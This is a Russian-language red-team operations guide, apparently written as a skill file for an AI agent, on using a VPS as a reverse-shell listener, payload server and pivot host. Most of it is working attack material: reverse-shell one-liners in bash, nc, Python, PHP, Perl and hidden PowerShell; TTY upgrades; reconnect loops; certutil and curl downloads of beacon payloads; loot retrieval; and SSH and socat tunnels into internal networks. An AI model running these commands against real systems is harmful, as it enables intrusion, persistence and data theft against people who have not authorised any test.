# Транзит через VPS и reverse shell (<IP_вашего_VPS>)

Собственный публичный VPS как **приёмник reverse shell + точка доставки payload + транзитный прыжковый хост во внутреннюю сеть**. Цели достаточно иметь доступ в интернет:
shell приходит на порт 9000-9999 VPS; агент через tmux-сессию **неинтерактивно** отправляет команды и читает вывод.

## Когда использовать / когда не использовать

| Сценарий | Выбор |
| --- | --- |
| Цель может напрямую подключиться к этой машине (та же сеть, есть публичный IP) | Слушайте прямо здесь, VPS **не нужен** |
| Цель только выходит в интернет, а эта машина за NAT | ✅ Использовать VPS — основной сценарий |
| Цель — облачный хост или контейнер: выход ограничен, но 80/443 доступны | ✅ Использовать 9000-9999 на VPS (если ограничено — порты вида 443/80, см. устранение проблем) |
| Нужно только прогнать одну команду и получить результат | В приоритете HTTP-канал веб-уязвимости/RCE — стабильнее и незаметнее reverse shell |

## Активы и учётные данные

```
хост    : <IP_вашего_VPS> (Tencent Cloud, Ubuntu 24.04, 2C2G, имя хоста <имя_хоста_VPS>)
пользователь : ubuntu (sudo без пароля)
приватный ключ    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← права 600, не копируйте в репозиторий/чат
доступные порты: 9000-9999                                   ← в security group облака открыт только этот диапазон
скрипт инструмента: ~/.dsh/redteam/toolkit/vps/vps.sh
```

**Дисциплина по ключам**: приватный ключ только по указанному пути. Ни при каких условиях не пишите его содержимое в файлы навыков, отчёты, репозиторий или чат.

Постоянно занятые порты: **9001 / 9007 / 9009 (а также временные сервисы вроде 9008)**, плюс tmux-сессии `cap / sh / up / www`.
**Они не относятся к текущему учению: не убивайте и не перезаписывайте их.**

## Быстрый старт

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # статус VPS, свободные порты, существующие сессии
$VPS listen                 # автоматически выбрать свободный порт и начать слушать (можно $VPS listen 9000)
# → получив порт, выполните команду обратного подключения через уязвимость на цели (см. следующий раздел)
$VPS send 9000 'id; uname -a'      # после подключения цели отправить команду
$VPS read 9000 60                  # прочитать вывод
$VPS kill 9000                     # после работы обязательно очистить
```

`listen` использует tmux + rlwrap + **цикл автоматического перезапуска слушателя**: при обрыве соединения слушатель поднимается снова, удобно при повторных срабатываниях.

## Использование инструмента (vps.sh)

| Подкоманда | Действие |
| --- | --- |
| `status` | Данные VPS, система, готовность инструментов, занятость 9000-9999, tmux-сессии |
| `port` | Вернуть свободный порт из 9000-9999 |
| `listen [port]` | Постоянный слушатель (без порта — выберет сам), печатает шаблон команды для цели |
| `sessions` | Список tmux-сессий на VPS |
| `send <port> '<cmd>'` | **Отправить команду в уже подключённый reverse shell** (основной режим для агента) |
| `read <port> [строк]` | Прочитать последний вывод сессии (по умолчанию 200 строк) |
| `watch <port>` | Постоянно обновлять вывод (для человека) |
| `attach <port>` | Захватить сессию локальным tmux (для человека, выход `Ctrl-B D`) |
| `kill <port>` | Закрыть слушатель + очистить сессию + освободить порт |
| `serve [port] [dir]` | Поднять HTTP-сервис на VPS для скачивания payload целью (по умолчанию 9008) |
| `push <локальный> [удалённый]` | Загрузить файл на VPS |
| `get <удалённый> [локальный]` | Забрать файл с VPS (вытащить добычу с цели) |
| `sh '<команда>'` | Выполнить произвольную команду прямо на VPS |

Можно переопределить переменными окружения: `VPS_HOST`, `VPS_KEY`.

## Payload обратного подключения для цели (порт — тот, что вы слушаете)

```bash
# Bash (самое частое)
bash -c 'bash -i >& /dev/tcp/<IP_вашего_VPS>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<IP_вашего_VPS>/9000 <&1'

# семейство nc (версия с -e)
nc <IP_вашего_VPS> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP_вашего_VPS> 9000 > /tmp/f

# Python (запасной вариант без nc, совместим с python2/3)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP_вашего_VPS>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP (часто после получения shell на веб-стороне)
php -r '$s=fsockopen("<IP_вашего_VPS>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<IP_вашего_VPS>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP_вашего_VPS>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL-кодирование**: при работе через веб-уязвимость (инъекция команд/RCE) кодируйте payload в URL целиком перед передачей параметра, иначе `&` и `>` обрежутся.

## Подъём и стабилизация сессии

Shell из голого `nc` без TTY: `sudo` не работает, `su` не работает, `vi` и `top` ведут себя неправильно. Поднимаем:

```bash
# выполнять на цели (python3 встречается чаще всего)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# или
script -qc /bin/bash /dev/null
```

```bash
# на стороне этой машины (после attach) сделать Ctrl-C и стрелки рабочими
# в reverse shell по порядку: Ctrl-Z
stty raw -echo; fg
# нажать Enter дважды, затем
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**Более надёжный вариант: полный TTY-слушатель на socat** (socat на VPS уже установлен):

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# на стороне цели
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP_вашего_VPS>:9000
```

Автопереподключение при обрыве (цикл на стороне цели):

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<IP_вашего_VPS>/9000 0>&1'; sleep 10; done &
```

## Доставка payload (VPS как файловый транзит)

```bash
$VPS serve 9100 ~/rt/payloads        # поднять HTTP-сервис на VPS
$VPS push ./suo5 /home/ubuntu/rt/payloads/
# на стороне цели (Linux)
curl -O http://<IP_вашего_VPS>:9100/suo5  или  wget http://<IP_вашего_VPS>:9100/suo5
# на стороне цели (Windows)
certutil -urlcache -split -f http://<IP_вашего_VPS>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<IP_вашего_VPS>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**Забрать добычу**: `$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<цель>/runs/`

## Обратные туннели и транзит

Когда цель во внутренней сети и недостижима с этой машины, используйте VPS как прыжковый хост:

```bash
# обратный туннель: VPS:9200 → внутренний 10.0.0.5:8080 на цели (выполнять на цели)
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <ключ_на_цели> ubuntu@<IP_вашего_VPS>
# затем доступ с этой машины через VPS: ssh -L 8080:127.0.0.1:9200 ubuntu@<IP_вашего_VPS>

# проброс порта через socat (на VPS)
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

В сценарии с WebShell используйте навык `suo5-tunnel`: клиент suo5 оставьте на этой машине, серверную часть передайте на цель, а выход туннеля через VPS стабильнее.

## Дисциплина (обязательно)

1. **Дисциплина портов**: только 9000-9999; перед запуском слушателя проверьте через `$VPS port` или `$VPS status`, что порт свободен; **никогда не занимайте и не убивайте 9001, 9007, 9009 и сессии `cap/sh/up/www`**.
2. **После каждого использования обязателен `$VPS kill <port>`**: не оставляйте голых слушателей (это и расход ресурсов, и след).
3. **Учётные данные — в базу, не на VPS**: найденные на цели пароли и хеши записывайте через `redteam_credential_add` в локальную базу активов (открытый пароль в `secret_value`), добычу — в локальный `runs/`; **не пишите учётные данные в домашний каталог VPS**.
4. **IP VPS виден цели**: это инфраструктура текущего учения — не оставляйте на цели лишние персональные данные, кроме этого адреса.
5. **Запись в базу**: каждый успешно полученный shell — через `redteam_access_add` (хост/аккаунт/способ/права/ссылка на сессию), каждые учётные данные — через `redteam_credential_add`, скрипты атаки — в архив через `redteam_attack_file_add`.
6. **По каждой отправленной через `send` команде нужны доказательства из вывода `read`**: важный вывод сначала перенаправляйте в файл и забирайте через `get`, чтобы буфер прокрутки tmux не был затёрт.

## Устранение проблем

| Симптом | Что делать |
| --- | --- |
| Цель не подключается обратно | сначала убедитесь, что слушатель жив: `$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`; затем проверьте выход цели в интернет (если на цели `curl -s http://<IP_вашего_VPS>:<port>` устанавливает соединение, порт достижим) |
| Порт вне диапазона / смена порта | в security group облака открыт только 9000-9999, вне диапазона — гарантированный провал |
| Постоянные обрывы | добавьте на цели цикл переподключения `while true` либо используйте полный TTY через socat |
| Вывод есть, но команды не выполняются | payload обрезан в URL (`&`/`>`): кодируйте целиком |
| Кракозябры (китайский вывод) | на цели `export LANG=C.UTF-8` либо перед `read` включите в tmux `tmux set -t rt-<port> utf8 on` |
| Нет TTY, `sudo` выдаёт ошибку | поднимите PTY (см. выше) |
| С этой машины «все порты доступны» | локальный шлюз отвечает SYN-ACK на любой порт, **`nc -z` здесь не проверяет достижимость портов VPS**; проверяйте с внешнего узла или с самой цели |

## Связь с другими навыками

- `suo5-tunnel`: WebShell → туннель SOCKS5, выход может идти через этот VPS
- `webshell-toolkit`: Behinder/Godzilla/ANTSWORD — управление после получения WebShell
- `cn-proxy-pool`: наложение прокси, когда нужен китайский выходной IP (сетевую конфигурацию машины не менять)
- `active-scan` / `fofa-recon`: продолжение картирования после получения доступа во внутреннюю сеть
